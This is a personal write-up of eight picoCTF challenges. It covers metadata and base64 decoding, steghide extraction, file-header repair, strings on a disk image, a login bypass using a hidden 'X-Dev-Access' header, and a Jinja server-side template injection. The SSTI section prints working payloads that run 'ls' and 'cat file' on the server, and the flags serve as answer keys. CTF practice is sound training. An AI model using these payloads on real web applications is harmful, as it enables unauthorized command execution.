# Pico CTF - writeup

[My profile](https://learn.cylabacademy.org/users/UmeshC)

## Riddle Registry
Hi, intrepid investigator! 📄🔍 You've stumbled upon a peculiar PDF filled with what seems like nothing more than garbled nonsense. But beware! Not everything is as it appears. Amidst the chaos lies a hidden treasure—an elusive flag waiting to be uncovered. Find the PDF file here [Hidden Confidential Document](https://challenge-files.picoctf.net/c_saffron_estate/752a14d378d241efef396229bf41330061c1a0e73f7b3268a7e6db8d94fd4cd1/confidential.pdf) and uncover the flag within the metadata.

### Actions performed
Checked the file properties **- Did not help**

Checked by opening in Notepad++  **- Did not help**

Checked metadata online [Read PDF Metadata, View PDF Metadata Online | PDFYeah](https://www.pdfyeah.com/view-pdf-metadata/) in the pdf and found author to be 
cGljb0NURntwdXp6bDNkX20zdGFkYXRhX2YwdW5kIV9mOTQzMDBjNH0=

This looks like base64 encoding. Decode it using online tool.  [CyberChef](https://cyberchef.io/)

~~picoCTF{puzzl3d_m3tadata_f0und!_f94300c4}~~


## Log Hunt
Our server seems to be leaking pieces of a secret flag in its logs. The parts are scattered and sometimes repeated. Can you reconstruct the original flag?Download the [logs](https://challenge-files.picoctf.net/c_saffron_estate/ce7c1c992c13f4c2498aeb507697ef67d4a8a87adec67cb2db0b8e491103e18d/server.log) and figure out the full flag from the fragments.

### Actions performed
Downloaded the log file and clearly flagpart is visible in text. This is split over multiple files
 
~~picoCTF{us3_y0urlinux_sk1lls_cedfa5fb}~~



## Hidden in plainsight
You’re given a seemingly ordinary JPG image. Something is tucked away out of sight inside the file. Your task is to discover the hidden payload and extract the flag.Download the jpg image [here](https://challenge-files.picoctf.net/c_saffron_estate/5037bce9fb8a1d1975211489cedcdcd2e374d9e1837d7ce76dc3355ba5d71952/img.jpg).

### Actions performed
Checked the plain text -  **did not find anything useful**

Checked the exiftool online [Free Online EXIF Metadata Viewer & Extractor Tool - ExifMeta](https://exifmeta.com/), nothing spl except 


> Comment :    **c3RlZ2hpZGU6Y0VGNmVuZHZjbVE9**

Use magic feature of [CyberChef](https://cyberchef.io/) when do not know what to do 

*c3RlZ2hpZGU6Y0VGNmVuZHZjbVE9* => from base64 translates to    **steghide:cEF6endvcmQ=**

*cEF6endvcmQ=* => from base64 translates to **pAzzword**

**steghide** is the cli tool to hide/show the steganographed content from image file

> Command : **steghide extract -sf img.jpg -p pAzzword**

Extracts data to a file. 

~~picoCTF{h1dd3n_1n_1m4g3_656e4d79}~~

##	Flag in Flame
The SOC team discovered a suspiciously large log file after a recent breach. When they opened it, they found an enormous block of encoded text instead of typical logs. Could there be something hidden within? Your mission is to inspect the resulting file and reveal the real purpose of it. The team is relying on your skills to uncover any concealed information within this unusual log.Download the encoded data here: [Logs Data](https://challenge-files.picoctf.net/c_amiable_citadel/7644875fe64cafe647bcd166855b1adf4368ed7f13be7acb281f8647eb0a5b83/logs.txt). Be prepared—the file is large, and examining it thoroughly is crucial .

### Actions Performed

Checked the file in notepad, **could not find any info**
Checked the [CyberChef](https://cyberchef.io/) to read it as base64 data.
Found the start character are .PNG, might be an image file.

Save the decoded base64 data and renamed to PNG
Once the image is opened, it has ascii code in Hex format.

Ascii converted to flag as

~~picoCTF{forensics_analysis_is_amazing_ec1984fc}~~


##	Crack the Gate 1
We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
Additional details will be available after launching your challenge instance.

### Actions Performed
With viewing the source and help of hint, the comment is 
ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"

**Decoded using:** [ROT Cipher - Rotation - Online Rot Decoder, Solver, Translator](https://www.dcode.fr/rot-cipher)
temporary bypass: use header "X-Dev-Access: yes"

Launched the web page, enter the username as in question and dummy password.

In devetools of browser
1. logged the post request
2. Copied the post request as fetch
3. updated headers to add the X-Dev-Access
4. Rerun the fetch in console
5. Read the response for this new POST query

~~"flag": "picoCTF{brut4_f0rc4_b3a957eb}"~~

##	Corrupted file
This file seems broken... or is it? Maybe a couple of bytes could make all the difference. Can you figure out how to bring it back to life?Download the file [here](https://challenge-files.picoctf.net/c_amiable_citadel/10f12b1f51f0a73a50f6bd08cc2d0ef6b1e8039a27daac52f27b450dabeaec97/file).

### Actions Performed
**Hint 1:** Try checking the file’s header.

**Hint 2:** JPEG

**Hint 3:** Tools like xxd or hexdump can help you inspect and edit file bytes.

From the hints, file type is JPEG.
Created a dummy JPEG file from paint.
Compared the headers of created and downloaded file.
updated the header and renamed 
Flag is displayed in JPEG image.

 ~~picoCTF{r3st0r1ng_th3_by73s_efd8c6c0}~~

##	DISKO 1
Can you find the flag in this disk image?Download the disk image [here](https://artifacts.picoctf.net/c/537/disko-1.dd.gz).

### Actions Performed
**Hint 1:** Maybe Strings could help? If only there was a way to do that?

1. Downloaded the file gz.
2. Extracted the dd file from the gz
3. Strings on dd file gave the flag   (strings disko-1.dd | grep pico)
 
 ~~picoCTF{1t5_ju5t_4_5tr1n9_be6031da}~~

 ## SSTI1
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps!

### Actions Performed
Launched the website, its has only a textbox to enter string. On submit, a new page opens with text as announcement

Tried for SSTI. **(from Hint)**
> Entered {{7*7}}  => announcement is 49. **Indicates that it is a Jinja server**

Now tried for request object  {{request}}
`{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`

Read the contents of the folder.

The working directory contains, few files. One of them is file.
Cat the file to read its contents
` {{request.application.__globals__.__builtins__.__import__('os').popen("cat file").read()}}`

~~picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}~~